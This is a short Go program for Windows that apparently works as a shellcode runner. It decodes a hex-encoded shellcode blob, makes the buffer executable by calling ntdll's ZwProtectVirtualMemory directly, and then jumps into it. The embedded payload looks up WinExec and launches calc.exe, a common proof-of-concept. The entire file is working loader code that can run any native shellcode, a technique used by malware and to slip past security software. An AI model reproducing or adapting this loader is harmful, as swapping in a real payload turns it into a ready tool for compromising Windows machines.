// +build windows
package main

import (
	"encoding/hex"
	"log"
	"syscall"
	"unsafe"
)

const (
	PAGE_EXECUTE uintptr = 0x10
)

func RUN(buf []byte) {
	var hProcess uintptr = 0
	var pBaseAddr = uintptr(unsafe.Pointer(&buf[0]))
	var dwBufferLen = uint(len(buf))
	var dwOldPerm uint32

	syscall.NewLazyDLL("ntdll").NewProc("ZwProtectVirtualMemory").Call(
		hProcess-1,
		uintptr(unsafe.Pointer(&pBaseAddr)),
		uintptr(unsafe.Pointer(&dwBufferLen)),
		PAGE_EXECUTE,
		uintptr(unsafe.Pointer(&dwOldPerm)),
	)
	syscall.Syscall(uintptr(unsafe.Pointer(&buf[0])), 0, 0, 0, 0)
}

func main() {
	shellcode, err := hex.DecodeString(`33C9648B59308B5B0C8B7314AD96AD8B58108B533C03D38B527803D38B722003F333C941AD03C3813857696E4575F4498B722403F3668B0C4E8B721C03F38B148E03D333C05250682E6578656863616C63686D33325C68797374656877735C5368696E646F68433A5C578BF46A0A56FFD283C41C585A`)
	if err != nil {
		log.Fatalln(err)
	}
	RUN(shellcode)
}
